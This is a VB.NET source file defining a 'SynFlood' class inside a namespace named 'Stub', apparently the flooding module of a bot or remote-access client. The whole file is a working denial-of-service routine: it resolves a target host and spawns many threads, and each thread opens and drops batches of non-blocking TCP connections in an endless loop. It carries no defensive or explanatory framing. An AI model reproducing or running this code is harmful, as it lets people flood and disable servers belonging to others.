Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Namespace Stub

    Friend Class SynFlood
        Private Shared FloodingJob As ThreadStart()
        Private Shared FloodingThread As Thread()
        Public Shared Host As String
        Private Shared ipEo As IPEndPoint
        Public Shared Port As Integer
        Private Shared SynClass As SendSyn()
        Public Shared SynSockets As Integer
        Public Shared Threads As Integer

        Public Shared Sub StartSynFlood()
            Try
                ipEo = New IPEndPoint(Dns.GetHostEntry(Host).AddressList(0), Port)
            Catch
                ipEo = New IPEndPoint(IPAddress.Parse(Host), Port)
            End Try
            FloodingThread = New Thread(Threads - 1) {}
            FloodingJob = New ThreadStart(Threads - 1) {}
            SynClass = New SendSyn(Threads - 1) {}
            For i As Integer = 0 To Threads - 1
                SynClass(i) = New SendSyn(ipEo, SynSockets)
                FloodingJob(i) = New ThreadStart(AddressOf SynClass(i).Send)
                FloodingThread(i) = New Thread(FloodingJob(i))
                FloodingThread(i).Start()
            Next
        End Sub

        Public Shared Sub StopSynFlood()
            For i As Integer = 0 To Threads - 1
                Try
                    FloodingThread(i).Suspend()
                Catch
                End Try
            Next
        End Sub

        Private Class SendSyn
            Private ipEo As IPEndPoint
            Private Sock As Socket()
            Private SynSockets As Integer

            Public Sub New(ByVal ipEo As IPEndPoint, ByVal SynSockets As Integer)
                Me.ipEo = ipEo
                Me.SynSockets = SynSockets
            End Sub

            Public Sub OnConnect(ByVal ar As IAsyncResult)
            End Sub

            Public Sub Send()
                Dim num As Integer
Label_0000:
                Try
                    Me.Sock = New Socket(Me.SynSockets - 1) {}
                    For num = 0 To Me.SynSockets - 1
                        Me.Sock(num) = New Socket(Me.ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
                        Me.Sock(num).Blocking = False
                        Dim callback As New AsyncCallback(AddressOf Me.OnConnect)
                        Me.Sock(num).BeginConnect(Me.ipEo, callback, Me.Sock(num))
                    Next
                    Thread.Sleep(100)
                    For num = 0 To Me.SynSockets - 1
                        If Me.Sock(num).Connected Then
                            Me.Sock(num).Disconnect(False)
                        End If
                        Me.Sock(num).Close()
                        Me.Sock(num) = Nothing
                    Next
                    Me.Sock = Nothing
                    GoTo Label_0000
                Catch
                    For num = 0 To Me.SynSockets - 1
                        Try
                            If Me.Sock(num).Connected Then
                                Me.Sock(num).Disconnect(False)
                            End If
                            Me.Sock(num).Close()
                            Me.Sock(num) = Nothing
                        Catch
                        End Try
                    Next
                    GoTo Label_0000
                End Try
            End Sub
        End Class
    End Class
End Namespace
